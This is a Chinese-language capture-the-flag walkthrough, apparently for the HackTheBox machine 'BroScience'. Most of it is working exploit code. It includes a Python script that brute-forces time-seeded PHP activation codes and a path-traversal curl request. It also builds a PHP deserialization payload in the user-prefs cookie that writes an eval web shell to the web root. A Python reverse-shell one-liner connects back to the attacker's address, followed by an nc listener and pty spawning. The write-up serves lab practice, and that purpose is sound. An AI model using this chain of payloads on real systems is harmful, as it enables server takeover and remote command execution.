<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">    srand(time());</span><br><span class="line">    <span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rel_time</span>(<span class="params"><span class="variable">$from</span>, <span class="variable">$to</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$to</span> = ((<span class="variable">$to</span> === <span class="literal">null</span>) ? (time()) : (<span class="variable">$to</span>));</span><br><span class="line">    <span class="variable">$to</span> = ((is_int(<span class="variable">$to</span>)) ? (<span class="variable">$to</span>) : (strtotime(<span class="variable">$to</span>)));</span><br><span class="line">    <span class="variable">$from</span> = ((is_int(<span class="variable">$from</span>)) ? (<span class="variable">$from</span>) : (strtotime(<span class="variable">$from</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$units</span> = <span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;year&quot;</span>   =&gt; <span class="number">29030400</span>, <span class="comment">// seconds in a year   (12 months)</span></span><br><span class="line">        <span class="string">&quot;month&quot;</span>  =&gt; <span class="number">2419200</span>,  <span class="comment">// seconds in a month  (4 weeks)</span></span><br><span class="line">        <span class="string">&quot;week&quot;</span>   =&gt; <span class="number">604800</span>,   <span class="comment">// seconds in a week   (7 days)</span></span><br><span class="line">        <span class="string">&quot;day&quot;</span>    =&gt; <span class="number">86400</span>,    <span class="comment">// seconds in a day    (24 hours)</span></span><br><span class="line">        <span class="string">&quot;hour&quot;</span>   =&gt; <span class="number">3600</span>,     <span class="comment">// seconds in an hour  (60 minutes)</span></span><br><span class="line">        <span class="string">&quot;minute&quot;</span> =&gt; <span class="number">60</span>,       <span class="comment">// seconds in a minute (60 seconds)</span></span><br><span class="line">        <span class="string">&quot;second&quot;</span> =&gt; <span class="number">1</span>         <span class="comment">// 1 second</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$diff</span> = abs(<span class="variable">$from</span> - <span class="variable">$to</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$diff</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just now&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$suffix</span> = ((<span class="variable">$from</span> &gt; <span class="variable">$to</span>) ? (<span class="string">&quot;from now&quot;</span>) : (<span class="string">&quot;ago&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$unitCount</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$units</span> <span class="keyword">as</span> <span class="variable">$unit</span> =&gt; <span class="variable">$mult</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$diff</span> &gt;= <span class="variable">$mult</span> &amp;&amp; <span class="variable">$unitCount</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$unitCount</span> += <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// $and = (($mult != 1) ? (&quot;&quot;) : (&quot;and &quot;));</span></span><br><span class="line">            <span class="variable">$and</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="string">&quot;, &quot;</span>.<span class="variable">$and</span>.intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>).<span class="string">&quot; &quot;</span>.<span class="variable">$unit</span>.((intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) == <span class="number">1</span>) ? (<span class="string">&quot;&quot;</span>) : (<span class="string">&quot;s&quot;</span>));</span><br><span class="line">            <span class="variable">$diff</span> -= intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) * <span class="variable">$mult</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> .= <span class="string">&quot; &quot;</span>.<span class="variable">$suffix</span>;</span><br><span class="line">    <span class="variable">$output</span> = substr(<span class="variable">$output</span>, strlen(<span class="string">&quot;, &quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = base64_encode(serialize(<span class="keyword">new</span> UserPrefs()));</span><br><span class="line">            setcookie(<span class="string">&#x27;user-prefs&#x27;</span>, <span class="variable">$up_cookie</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$up</span>-&gt;theme;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;light&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme_class</span>(<span class="params"><span class="variable">$theme</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$theme</span>)) &#123;</span><br><span class="line">        <span class="variable">$theme</span> = get_theme();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$theme</span>, <span class="string">&quot;light&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-light&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-dark&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_theme</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;user-prefs&#x27;</span>,base64_encode(serialize(<span class="keyword">new</span> UserPrefs(<span class="variable">$val</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">        fclose(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line">        <span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>用户激活码生成来自于种子为<code>time()</code>的随机序列</p>
<p>编写以下Python脚本以自动注册并枚举时间以激活</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">register_url = <span class="string">&quot;https://broscience.htb/register.php&quot;</span></span><br><span class="line">register_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;bfl2&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;bfl2@bfl.bfl&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;bfl&quot;</span>, <span class="string">&quot;password-confirm&quot;</span>: <span class="string">&quot;bfl&quot;</span>&#125;</span><br><span class="line">activate_url = <span class="string">&quot;https://broscience.htb/activate.php?code=%s&quot;</span></span><br><span class="line"></span><br><span class="line">res = req.get(url = register_url, verify = <span class="literal">False</span>)</span><br><span class="line">start_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">start_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % start_time_str, shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = req.post(url = register_url, data = register_data, verify = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;created&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">	print(<span class="string">&quot;Created.&quot;</span>)</span><br><span class="line">end_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">end_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % end_time_str, shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_time = <span class="built_in">int</span>(start_time)</span><br><span class="line">end_time = <span class="built_in">int</span>(end_time)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(start_time, end_time + <span class="number">1</span>):</span><br><span class="line">	code = subprocess.Popen(<span class="string">&quot;php -r &#x27;include \&quot;code.php\&quot;; echo generate_activation_code(%s);&#x27;&quot;</span> % <span class="built_in">str</span>(_), shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line">	print(code)</span><br><span class="line">	res = req.get(url = activate_url % code)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;Invalid&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">		print(<span class="string">&quot;Activated.&quot;</span>)</span><br><span class="line">		print(register_data)</span><br></pre></td></tr></table></figure>
<p><code>code.php</code>如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># code.php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"><span class="variable">$time</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">		srand(<span class="variable">$time</span>);</span><br><span class="line">		<span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>登陆后主页发现一个切换主题按钮，查看其代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f/swap_theme.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># payload.php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if user is logged in already</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: /index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Swap the theme</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;includes/utils.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;dark&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Redirect</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">&#123;$_SERVER[&#x27;HTTP_REFERER&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合<code>utils.php</code>，即可分析出如下反序列化漏洞利用过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) -&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) -&gt;</span></span><br><span class="line">$up_cookie = $_COOKIE[&#x27;user-prefs&#x27;]; -&gt;</span><br><span class="line"><span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>)); -&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> -&gt;</span></span><br><span class="line">public function __wakeup() -&gt; </span><br><span class="line">fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br></pre></td></tr></table></figure>
<p>在<code>$up = unserialize(base64_decode($up_cookie));</code>这步过程中，序列化结果加入一个<code>AvatarInterface</code>对象，反序列化构造这个<code>AvatarInterface</code>对象时会调用<code>__wakeup()</code></p>
<p>编写<code>payload.php</code>如下，使用<code>php://input</code>和POST数据配合进行内容写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line">			<span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">			fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">			fclose(<span class="variable">$f</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line">			<span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$BFL</span> = <span class="keyword">new</span> UserPrefs();</span><br><span class="line">		<span class="variable">$BFL</span>-&gt;theme = <span class="keyword">new</span> AvatarInterface();</span><br><span class="line">		<span class="variable">$BFL</span>-&gt;theme-&gt;imgPath = <span class="string">&quot;/var/www/html/BFL.php&quot;</span>;</span><br><span class="line">		<span class="variable">$BFL</span>-&gt;theme-&gt;tmp = <span class="string">&quot;php://input&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$BFL</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	payload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>生成Payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -f payload.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0&#x3D;</span><br></pre></td></tr></table></figure>
<p><code>PHPSESSID</code>为登陆后服务器给的值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/swap_theme.php -H <span class="string">&quot;Cookie: PHPSESSID=5l9ql8diuiej262srrp4chu47e; user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0=&quot;</span> -d <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
<p>即可在<code>/var/www/html/BFL.php</code>写入内容<code>&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;</code></p>
<p>构造反弹Shell语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
<p>进行反弹Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/BFL.php -d <span class="string">&#x27;BFL=system(base64_decode(&quot;BASE64_ENCODED_PAYLOAD&quot;));&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
<p>获取Shell之后获取tty并查看端口监听信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure>
